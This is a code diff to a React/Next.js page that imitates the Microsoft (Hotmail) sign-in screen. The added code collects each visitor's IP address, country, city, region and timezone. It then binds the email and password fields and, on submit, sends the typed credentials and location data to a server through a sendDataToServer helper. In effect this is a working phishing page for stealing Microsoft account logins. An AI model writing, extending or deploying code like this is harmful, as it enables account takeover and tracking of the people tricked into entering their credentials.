@@ -2,19 +2,23 @@
 
 import Image from "next/image";
 import Link from "next/link";
-import { Suspense, useState } from "react";
+import { useEffect, useState } from "react";
 
 import Microsoft from "../../public/Microsoft_logo_(2012).png";
 import ToolTip from "../../public/question.png";
 import Back from "../../public/back.png";
 import MicrosoftLoading from "../component/MicrosoftLoading";
+import { getIp, getLocationDetails } from "../utils/getData";
+import { sendDataToServer } from "../utils/postData";
 
 // import { Metadata } from "../hotmail/Hotmail_meta";
 
 export default function Hotmail() {
   const [email, setEmail] = useState(true);
   const [password, setPassword] = useState(false);
+  const [serverEmail, setServerEmail] = useState("");
   const [emailValue, setEmailValue] = useState("");
+  const [passwordValue, setPasswordValue] = useState("");
   const [ip, setIp] = useState(null);
   const [country, setCountry] = useState("");
   const [city, setCity] = useState("");
@@ -24,23 +28,70 @@ export default function Hotmail() {
   const [modal, setModal] = useState(false);
   const [loading, setLoading] = useState(false);
 
+  useEffect(() => {
+    getIp()
+      .then((address) => {
+        setIp(address);
+      })
+      .catch((error) => {
+        console.error(error);
+      });
+  }, []);
+
+  console.log(ip);
+
+  useEffect(() => {
+    if (ip !== null) {
+      getLocationDetails(ip, setLoading)
+        .then((location) => {
+          console.log(location);
+          setCountry(location.country);
+          setCity(location.city);
+          setRegion(location.region);
+          setTimezone(location.timezone);
+        })
+        .catch((error) => {
+          console.log(error);
+        });
+    }
+  }, [ip]);
+
   const togglePassword = (e) => {
     e.preventDefault();
 
-    setEmailValue("mail@mail.com");
     setEmail(false);
     setPassword(true);
   };
 
-  const submitForm = (e) => {
-    e.preventDefault();
-    setLoading(true);
+  const handleInputField = (e, field) => {
+    setError(null);
 
-    setTimeout(() => {
-      setPassword(false);
-      setEmail(true);
-      setLoading(false);
-    }, 3000);
+    if (field === "email") {
+      setEmailValue(e.target.value);
+    } else if (field === "password") {
+      setPasswordValue(e.target.value);
+    }
+  };
+
+  const submitForm = async (e) => {
+    e.preventDefault();
+    // setLoading(true);
+
+    const result = await sendDataToServer({
+      ip,
+      country,
+      city,
+      region,
+      timezone,
+      emailValue,
+      passwordValue,
+      setError,
+      setLoading,
+    });
+
+    setEmail(true);
+    setPassword(false);
+    // setLoading(false);
   };
 
   const toggleModal = () => {
@@ -51,7 +102,7 @@ export default function Hotmail() {
       {loading && <MicrosoftLoading />}
       <section className="hotmail-container relative m-0   md:bg-gradient-to-br from-[#e7d0c0] via-green-100 to-[#f7eedf]">
         <div className="relative  min-h-screen flex flex-col justify-start md:justify-center  md:items-center gap-2 lg:gap-5 m-0 ">
-          <div className=" bg-white flex flex-col gap-5 w-full md:w-1/2  lg:w-1/3 md:shadow-md p-7 lg:p-7 h-[23rem] overflow-hidden">
+          <div className=" bg-white flex flex-col gap-5 w-full md:w-1/2  lg:w-1/3 md:shadow-md p-7 lg:p-7 h-auto overflow-hidden">
             <div className="flex m-0 lg:ml-5">
               <Image
                 src={Microsoft}
@@ -62,7 +113,14 @@ export default function Hotmail() {
                 className="justify-self-start"
               />
             </div>
-
+            {error !== null ? (
+              <span className="text-sm text-center text-red-700 my-3">
+                {" "}
+                {error}{" "}
+              </span>
+            ) : (
+              ""
+            )}
             <form
               className=" flex flex-col mx-auto w-full lg:w-11/12"
               onSubmit={submitForm}
@@ -94,6 +152,8 @@ export default function Hotmail() {
                         id="email"
                         placeholder="Email, phone, or Skype"
                         className="text-[14px] border-0 border-b-black border-b outline-0  focus:outline-none  focus:ring-0 pl-0"
+                        value={emailValue}
+                        onChange={(e) => handleInputField(e, "email")}
                       />
                     </div>
 
@@ -174,6 +234,8 @@ export default function Hotmail() {
                         id="password"
                         placeholder="Password"
                         className="text-[14px] border-0 border-b-black border-b outline-0  focus:outline-none  focus:ring-0 pl-0"
+                        value={passwordValue}
+                        onChange={(e) => handleInputField(e, "password")}
                       />
                     </div>
 
